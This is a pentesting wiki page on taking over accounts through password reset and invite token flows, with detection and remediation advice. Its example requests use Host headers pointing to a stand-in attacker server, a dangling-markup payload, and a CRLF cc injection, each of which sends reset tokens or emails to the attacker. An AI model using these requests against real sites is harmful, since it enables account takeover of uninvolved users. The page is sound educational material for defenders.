---
title: "Attacking password reset and invite tokens: host-header poisoning, predictable tokens, and account takeover"
description: How a pentester takes over accounts through reset and invite flows—Host header poisoning, weak or reusable tokens, response-body leakage, dangling-markup poisoning, and identifier tampering—with example requests, detection, and remediation.
keywords:
  - password reset
  - account takeover
  - host header poisoning
  - invite token
  - magic link
  - IDOR
---

# Password reset and invite tokens

Application-level weaknesses in the one-time tokens that gate password reset, account invitation, and magic-link login. Because a reset token is, by design, a temporary credential that grants control of an account, any flaw in how it is **generated, delivered, validated, or retired** leads directly to **account takeover**.

> **Scope.** Authorized testing only. Reset and invite testing manipulates real accounts and inboxes—stay within engagement scope, and avoid locking out or destroying genuine users' accounts.

## Overview

The canonical reset flow has four steps: the user submits an identifier to `POST /forgot-password`; the server generates a token bound to that account; the server emails a link such as `https://site.com/reset?token=<token>`; the user clicks it and the server validates the token before changing the password. Invite flows are structurally identical—an admin triggers an email with `?invite=<token>` that provisions an account, often with a pre-assigned role or tenant.

The trust boundary breaks at five points: **how the URL is built** (does the server trust the `Host` header?), **how the token is generated** (CSPRNG vs predictable), **how it is validated and retired** (single-use, expiry, bound to the right user), **how it travels** (Referer or response-body leakage), and for invites, **what it authorizes** (a role chosen by the inviter vs. tamperable by the recipient).

## Exploitation

### Host header poisoning (token theft)

Many apps build the reset URL from the inbound `Host` header. Override it so the link in the victim's email points to your server; when the victim—or an email-scanning bot—loads it, the token lands in your access log.

```
POST /forgot-password HTTP/1.1
Host: attacker-exploit-server.net
X-Forwarded-Host: attacker-exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

Then read the victim's token from your server log and use it on the real site: `GET /reset?token=<carlos-token>`. If `Host` is locked at the edge, test `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-Original-URL`, or a duplicate `Host:` line—middleware often honors these.

### Password reset poisoning via dangling markup

When the `Host` value is reflected into the email's HTML unescaped, inject markup that swallows the following content (including the token) into a link to your server. PortSwigger's lab payload:

```
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER/?
```

The unbalanced quote and open `<a>` tag cause the rendered email to send the trailing reset URL to the attacker.

### Predictable or low-entropy tokens

Request several tokens and inspect for structure: sequential counters, timestamps, weak PRNG, or `base64(userId)` / `md5(email)`. A real example is CVE-2022-44938 (SeedDMS), which derived tokens from PHP `uniqid()`—a timestamp—so an attacker could regenerate a victim's token from the approximate request time. Short numeric (PIN-style) codes are brute-forceable with Burp Intruder when lifetime and rate limits are loose.

### Token not retired, leaked, or reusable

- **No single-use / no expiry**: use a token, then replay it; let a token age past its stated lifetime and retry (e.g. CVE-2026-28268 / Vikunja, where tokens were never invalidated on use, enabling persistent takeover).
- **Leaked in the response**: inspect the `POST /forgot-password` response body and headers—some APIs return the token directly (e.g. CVE-2025-58434 / FlowiseAI), removing the need for email access.
- **Referer leakage**: if the reset page loads third-party resources while the token is in the URL, the full URL leaks in the `Referer` header.

### Identifier tampering and IDOR

Swap the identifier so a token issued to *you* resets *someone else's* account, or bcc your address via duplicate parameters:

```
POST /reset?token=<YOUR_VALID_TOKEN> HTTP/1.1
Content-Type: application/x-www-form-urlencoded

userId=victim&new-password=Pwned123!&confirm-password=Pwned123!
```

```
email=victim@x.com&email=attacker@x.com
email=victim@x.com%0d%0acc:attacker@x.com
```

Also chain **email change without re-authentication**: with a hijacked session or CSRF, swap the account email, then trigger a normal reset to your inbox.

### Invite-token specifics

Invite tokens are often weaker than reset tokens—lower entropy, long or never-expiring. Enumerate `?invite=` values; sequential or `base64(email)` tokens let you claim others' invitations. Where the role or tenant is carried in the accept request (or in an encoded/JWT blob), tamper `role=member`→`role=admin` or change `org_id`/`tenant` and test whether the server re-derives privileges from stored state or trusts the submitted value.

## Detection (code review)

- **Token source**: flag non-CSPRNG generators—`Math.random`, `rand(`, `mt_rand`, `uniqid`, Java `java.util.Random`, timestamp seeds, `md5(`/`sha1(` over email/userId. Correct: `secrets.token_urlsafe`, `crypto.randomBytes`, `SecureRandom`.
- **URL from Host**: `request.host`, `getServerName`, `X-Forwarded-Host`, `req.headers.host`, `$_SERVER['HTTP_HOST']` used in email composition.
- **Single-use/expiry**: token row marked used/deleted in the same transaction as the password write (TOCTOU), plus an `expires_at` check.
- **Comparison**: `==`/`.equals()` on tokens (timing leak) vs constant-time (`hmac.compare_digest`, `crypto.timingSafeEqual`).
- **Re-auth**: change-email/change-password handlers require the current password (WSTG-ATHN-09).

## Remediation

Generate tokens with a **CSPRNG** (≥128 bits) and store only their hash; enforce **short expiry** and **single-use**, invalidated atomically on consumption. Never build URLs from the `Host`/`X-Forwarded-*` headers—use a hard-coded canonical domain. **Re-authenticate** on email or password change. Use **constant-time** comparison, set `Referrer-Policy: no-referrer` on reset pages, and never return the token in a response. Rate-limit per account and keep responses/timing uniform to prevent enumeration. For invites, bind role/tenant server-side and bind the token to the invited email.

## Tools

- **Burp Suite** — Repeater/Intruder for host-header injection, token brute force, and parameter tampering; the **Param Miner** extension for header discovery.

## References

- PortSwigger — [Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) and the [middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware) / [dangling-markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup) labs
- OWASP — [Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- OWASP WSTG — [Testing for Weak Password Change or Reset Functionalities (WSTG-ATHN-09)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.html)
- PayloadsAllTheThings — [Account Takeover](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md)

## See also

- [Authentication (parent)](index.md)
- [Host header poisoning](oauth-redirect-misconfiguration.md) is adjacent; see also [request forgery](../injection/request-forgery/index.md).
- [Session fixation](session-fixation.md)
